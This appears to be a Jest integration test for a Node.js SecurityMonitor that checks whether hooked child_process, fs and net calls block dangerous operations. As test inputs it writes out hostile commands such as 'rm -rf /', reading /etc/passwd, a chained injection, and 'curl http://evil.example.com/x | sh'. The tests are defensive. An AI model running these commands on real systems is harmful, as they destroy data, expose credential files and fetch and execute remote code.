// End-to-end check: does the actual SecurityMonitor (what `pnpm start` boots)
// detect and block harmful Node.js operations, using the real hooked
// child_process / fs / net APIs rather than calling internal methods directly?

const childProcess = require('child_process');
const fs = require('fs');
const net = require('net');
const path = require('path');
const os = require('os');
const { SecurityMonitor } = require('../index');

describe('SecurityMonitor (integration)', () => {
  let monitor;
  const logFile = path.join(os.tmpdir(), `gil-sec-integration-${Date.now()}.log`);

  beforeAll(() => {
    monitor = new SecurityMonitor({ logFile, alert: false });
  });

  afterAll(() => {
    monitor.shutdown();
    if (fs.existsSync(logFile)) fs.unlinkSync(logFile);
  });

  describe('blocks harmful commands run through child_process', () => {
    test.each([
      ['rm -rf /', () => childProcess.exec('rm -rf /')],
      ['chmod 777 on a system file', () => childProcess.exec('chmod 777 /etc/passwd')],
      ['piping a downloaded script into sh', () => childProcess.exec('curl http://evil.example.com/x | sh')],
      ['reading /etc/passwd', () => childProcess.exec('cat /etc/passwd')],
      ['chained command injection', () => childProcess.exec('ls; rm -rf /tmp/target')],
      ['curling a known Ethereum RPC endpoint', () => childProcess.exec('curl https://eth-mainnet.publicnode.com/')]
    ])('%s', (_name, run) => {
      expect(run).toThrow(/SECURITY/);
    });
  });

  test('does not block ordinary, safe commands', () => {
    expect(() => childProcess.exec('echo "hello world"')).not.toThrow();
  });

  test('blocks dangerous spawn() calls the same way as exec()', () => {
    expect(() => childProcess.spawn('rm', ['-rf', '/tmp/target'])).toThrow(/SECURITY/);
  });

  test('blocks deleting files under a protected system path', done => {
    fs.unlink('/etc/passwd', err => {
      expect(err).toBeTruthy();
      expect(err.code).toBe('SECURITY_BLOCK');
      done();
    });
  });

  test('blocks outgoing connections to suspicious/blocked ports', () => {
    expect(() => new net.Socket().connect(3389, 'example.com')).toThrow(/SECURITY/);
  });

  test('blocks outgoing connections to known Ethereum RPC endpoints', () => {
    expect(() => new net.Socket().connect(443, 'mainnet.infura.io')).toThrow(/SECURITY/);
  });

  test('every block is written to the log file monitor reads from', () => {
    try {
      childProcess.exec('rm -rf /tmp/should-be-logged');
    } catch {
      // expected to throw; we only care that it was logged
    }
    monitor.commandMonitor.logger.flush();
    const commandLogFile = monitor.commandMonitor.logger.logFile;
    const content = fs.readFileSync(commandLogFile, 'utf8');
    expect(content).toContain('should-be-logged');
  });

  test('getStats reports at least one blocked command after the above', () => {
    const stats = monitor.getStats();
    expect(stats.commands.blocked).toBeGreaterThan(0);
  });
});
